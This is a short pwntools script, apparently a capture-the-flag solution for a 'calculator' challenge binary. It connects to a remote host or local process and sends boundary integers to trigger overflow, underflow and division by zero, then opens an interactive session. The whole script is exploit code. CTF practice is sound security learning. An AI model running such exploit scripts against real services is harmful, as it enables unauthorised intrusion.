from pwn import *

if args.REMOTE:
    host = "34.75.76.65"
    port = 9002
    p = remote(host, port)
else:
    p = process('./einsteins-calculator')

p.sendline(b'0') # input
p.sendline(b'2147483647') # t1
p.sendline(b'1') # t2
p.sendline(b'1') # add

p.sendline(b'0') # input
p.sendline(b'-2147483648') #t1
p.sendline(b'1') #t2
p.sendline(b'2') # sub
#p.interactive()
p.sendline(b'0') #input
p.sendline(b'1')
p.sendline(b'0')
p.sendline(b'4')

p.sendline(b'0')
p.sendline(b'-1')
p.sendline(b'1')
p.sendline(b'6')
p.interactive()
